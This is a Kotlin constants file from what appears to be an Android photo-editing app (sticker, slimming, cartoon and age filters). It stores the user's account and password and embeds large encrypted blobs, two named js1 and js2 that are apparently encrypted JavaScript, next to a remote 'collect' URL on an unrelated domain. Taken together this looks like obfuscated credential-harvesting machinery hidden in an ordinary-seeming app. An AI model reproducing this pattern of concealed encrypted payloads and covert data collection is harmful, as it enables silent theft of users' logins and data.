package hui.shou.tao.base

import android.Manifest
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.tencent.mmkv.MMKV

const val TAG = "xxxxxxH"

const val KEY_ACCOUNT = "KEY_ACCOUNT"
const val KEY_PASSWORD = "KEY_PASSWORD"
const val KEY_IS_LOGIN = "KEY_IS_LOGIN"

const val KEY_CONFIG = "KEY_CONFIG"
const val KEY_UPDATE = "KEY_UPDATE"

const val KEY_AD_INVOKE_TIME = "KEY_AD_INVOKE_TIME"
const val KEY_AD_REAL_TIME = "KEY_AD_REAL_TIME"
const val KEY_AD_SHOWN = "KEY_AD_SHOWN"
const val KEY_AD_SHOWN_INDEX = "KEY_AD_SHOWN_INDEX"
const val KEY_AD_LAST_TIME = "KEY_AD_LAST_TIME"

val config = HashMap<String, Any>()

var isDisplayOpen = false

val permissions = arrayOf(
    Manifest.permission.READ_EXTERNAL_STORAGE,
    Manifest.permission.WRITE_EXTERNAL_STORAGE,
    Manifest.permission.CAMERA
)

val bottomTitle = arrayOf("Sticker", "Slimming", "Cartoon", "Age Alert")

const val testContent =
    "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"

const val testUrl = "https://kcoffni.xyz/api/open/collect"

const val js1 = "xKZqDMzIV8QnPakdwPqcDR53WdMKrWPbCFrEfVLO85fHbwnJP4LEoVWzlWR6GkiIW3y/lti/KDJu4ksBZLIsJNEMnv3wAU7Pc7QQiCc78j2ba18I3xMnP8INSvk6hStamGE07MlR0hGDfPPF3W5kOJ6JLKtsRs1odXZmrgJCbuyGPpEMQFAY8+aE6MFqGZBSlnTe7p1HD9NwORln+kriMXS2KTpqOADEQxp4G1m6Web0D8UfTH9dMOrS8GW171Hwas5tknnphfKhvKkWio3ku4LbHadQP1yyDP/LbqAoH/e7IO5XgxgU5VsvkF9ZSuX7VNcdkBgZKJ4="

const val js2 = "MNiEnW2g64/7yFBUreQV55bPARkSfK9qqcBhMGkuoJFqLDfGPi6yU3NFOjac16kmhe8wOfCEbAUpi9NOGzznL1qO6qMPinkXoFDNdds50Yu2JjaxoiV8St8YMmvkCP91+Vxrztyd0v6cgmfjgNmz731gtCIe9qDy0Ogw1bSwhymnPVI4PYnJ0Xk+mavyhDKvh3cr6lHxdaC+aWxO8YjX1xYsFlpb1XwC5vFOshcM3Q4WviNSZNACT1/hvGglSJQD+K6RJqDSqq+hfkFtzVK8avcbHa1MP9vrgvS0iZS38F/RPKlmNSx0vfzKnuIDzmrcqbx7+xUadsMx1NhRM48qR1bOmaJG5EelDlg/n/p6WDwhXvexTUeLQmYSljelka73ILAfuhdz5QIqZelxUsMs8+zecrwBk1qTqX26LMCLjyVPtlL8HQMSDsuRcH1W4R2hc5YCJ6Zbr2DVs82TuuF/NuqMxUtlfMaONI/mOcGiX3tduym9iwiTqyoiHGW36jFYUyWBkm0hGafD2XrV/rKvGhM4FvJ1IKJyrlF9pWBqj/54arR4KWsa6/Ikl2kNYmYbuTjWXSgZIeZIQjtkFLVHVt3FyGAlBJeL/062gL0nkcUzbKd8dNHuKM7G5biGvAm0XssZcbIc/7UOHyWbngx6ZzGrQLVxm1XuN2GyEtks/lqBdWe8ZT9RVrPSSSVS8dDavUalYRg4K9viR3dNBEAxUVQF3XCzbDYnX+uiifVJqwrQMlF5LKbcNv1xyxRWp+9uflZBk6nz2HcGuEJmsmokpK7VnnG1yF/wZnpjllWfxrLMgoNJN6HC13GOvfqWFWPiUY/WXI7Doo4xOItL713d3kFlJDrre1B1fPMka8ValzcsAqI7JFhjY4Nk3zVhYTQu5b4/kyRhVZpUp1+i0WdOlCX43OInF9l+rs+46k5dLjz8guSPjG1Hth1Uyrwhy9PJ69lYqDcMlBh1APn0+Ix+MGCi29yFlbFyj5zFDt6ny0wS43RTDeiWWJNzixTtrS9DAVr9n1eqkNgcUmbskVgcgA=="

var imageUrl = ""

var lastTime
    get() = MMKV.defaultMMKV().getLong(KEY_AD_LAST_TIME, 0)
    set(value) {
        MMKV.defaultMMKV().putLong(KEY_AD_LAST_TIME, value)
    }
var invokeTime
    get() = MMKV.defaultMMKV().getInt(KEY_AD_INVOKE_TIME, 0)
    set(value) {
        MMKV.defaultMMKV().putInt(KEY_AD_INVOKE_TIME, value)
    }

var realTime
    get() = MMKV.defaultMMKV().getInt(KEY_AD_REAL_TIME, 0)
    set(value) {
        MMKV.defaultMMKV().putInt(KEY_AD_REAL_TIME, value)
    }
private var adShown
    get() = MMKV.defaultMMKV().getString(KEY_AD_SHOWN, "") ?: ""
    set(value) {
        MMKV.defaultMMKV().putString(KEY_AD_SHOWN, value)
    }
var shownList
    get() = (adShown.ifBlank {
        "{}"
    }).let {
        Gson().fromJson<List<Boolean>>(it, object : TypeToken<List<Boolean>>() {}.type)
    }
    set(value) {
        adShown = Gson().toJson(value)
    }
var shownIndex
    get() = MMKV.defaultMMKV().getInt(KEY_AD_SHOWN_INDEX, 0)
    set(value) {
        MMKV.defaultMMKV().putInt(KEY_AD_SHOWN_INDEX, value)
    }

var userName
    get() = MMKV.defaultMMKV().getString(KEY_ACCOUNT, "") ?: ""
    set(value) {
        MMKV.defaultMMKV().putString(KEY_ACCOUNT, value)
    }

var userPwd
    get() = MMKV.defaultMMKV().getString(KEY_PASSWORD, "") ?: ""
    set(value) {
        MMKV.defaultMMKV().putString(KEY_PASSWORD, value)
    }

var login
    get() = MMKV.defaultMMKV().getBoolean(KEY_IS_LOGIN, false)
    set(value) {
        MMKV.defaultMMKV().putBoolean(KEY_IS_LOGIN, value)
    }